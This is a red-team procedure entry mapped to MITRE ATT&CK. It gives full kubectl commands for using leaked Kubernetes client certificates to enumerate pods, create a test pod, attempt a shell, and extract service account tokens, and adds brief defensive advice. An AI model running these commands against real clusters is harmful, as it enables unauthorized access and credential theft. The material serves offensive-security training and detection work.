---
tags:
  - kubernetes
  - privilege-escalation
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/kubectl]]'
  - '[[tools/Image-Editing-Software]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Discovery]]'
commands:
  - '[[commands/curl-set-instance-metadata]]'
  - '[[commands/curl-query-token-info]]'
  - '[[commands/kubectl-get-pods]]'
  - '[[commands/kubectl-create-pod]]'
  - '[[commands/kubectl-delete-pod]]'
  - '[[commands/kubectl-exec-pod]]'
  - '[[commands/kubectl-describe-pod]]'
  - '[[commands/kubectl-get-secret]]'
  - '[[commands/kubectl-exec-pod-with-token]]'
  - '[[commands/kubectl-exec-pod-with-token-namespace]]'
  - '[[commands/id]]'
  - '[[commands/ls]]'
  - '[[commands/exit]]'
platforms:
  - Kubernetes
techniques:
  - '[[Deploy Container]]'
  - '[[Exploitation for Privilege Escalation]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 21ea7754-5069-434c-87ca-f3e76386c9b6
created_at: '2025-12-11T06:10:23.478Z'
updated_at: '2025-12-11T06:10:23.478Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0004]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1610]]'
  - '[[T1068]]'
---
# Interact with Kubernetes Cluster Using Leaked Credentials

## Summary

This procedure uses leaked Kubernetes certs and keys to interact with the cluster via kubectl, enumerating resources and extracting service account tokens.

## Description

Authenticate with client certs to list pods, create/delete test pods, and leak secrets for escalation, despite some permission failures.

## Requirements

1. Leaked client.crt, client.pem, ca.crt, server URL
2. [[tools/kubectl]] installed
3. YAML for test pod

## Defense

Defensive measures and detection strategies:

- Use RBAC to limit service account permissions
- Monitor kubectl API calls
- Rotate credentials regularly

## Objectives

1. Enumerate cluster resources
2. Test creation privileges
3. Leak service account token

## Instructions

### Step 1: List Pods

**Context**: Enumerate all pods.

Execute [[commands/kubectl-get-pods]]:

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces
```

> Expected: Pod list.

### Step 2: Create and Delete Pod

**Context**: Test creation.

Execute [[commands/kubectl-create-pod]]:

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml
```

Then [[commands/kubectl-delete-pod]].

> Expected: Pod created/deleted.

### Step 3: Attempt Exec

**Context**: Test shell access (fails).

Execute [[commands/kubectl-exec-pod]]:

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash
```

> Expected: Forbidden error.

### Step 4: Leak Secret

**Context**: Describe and get secret.

Execute [[commands/kubectl-describe-pod]] then [[commands/kubectl-get-secret]].

> Expected: Secret YAML with token.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]
- [[Discovery]]

### Techniques

- [[Deploy Container]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques



## Commands Used

- [[commands/kubectl-get-pods]]
- [[commands/kubectl-create-pod]]
- [[commands/kubectl-delete-pod]]
- [[commands/kubectl-exec-pod]]
- [[commands/kubectl-describe-pod]]
- [[commands/kubectl-get-secret]]

## Tools Used

- [[tools/kubectl]]

## Tags

- [[kubernetes]]
- [[privilege-escalation]]
